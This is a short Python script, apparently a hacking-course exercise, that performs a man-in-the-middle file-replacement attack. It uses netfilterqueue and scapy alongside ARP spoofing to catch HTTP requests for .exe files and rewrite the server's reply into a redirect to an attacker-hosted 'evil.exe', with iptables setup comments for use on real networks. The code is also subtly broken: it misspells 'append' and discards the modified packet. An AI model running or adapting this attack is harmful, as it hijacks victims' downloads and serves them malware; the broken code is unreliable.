#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http #you need to pip install scapy_http 

#if tested on a real network:
#   -launch ARP spoofer
#   -set iptables as follow: iptables -I FORWARD -j NFQUEUE --queue-num 0
#   -lauch this script
#
#once you are done, flush the iptables: iptables --flush

#Set the iptables as follow to test on local machine test on local machine
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.appen(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP response!")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                #print(scapy_packet.show())
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: \
                                                        10.0.2.15/evil/evil.exe\n\n")


    packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

